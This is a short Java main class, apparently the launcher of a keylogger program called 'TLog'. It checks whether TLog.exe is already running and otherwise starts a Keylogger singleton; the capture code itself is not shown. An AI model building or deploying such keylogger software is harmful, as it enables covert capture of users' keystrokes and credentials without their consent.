import keylogger.Keylogger;
import utils.ActiveProcess;

import javax.swing.*;
import java.util.List;

public class Main {
    /**
     * @param args the command line arguments
     */
    public static void main(String[] args) {
        if (isTLogAlreadyStart(ActiveProcess.getActiveProcess())) {
            JOptionPane.showMessageDialog(null, "TLog is already running!", "ERROR", JOptionPane.ERROR_MESSAGE);
        } else {
            Keylogger.getInstance().start();
        }
    }

    private static boolean isTLogAlreadyStart(List<String> lista) {
        return lista.stream().anyMatch((s) -> (s.startsWith("TLog.exe")));
    }
}
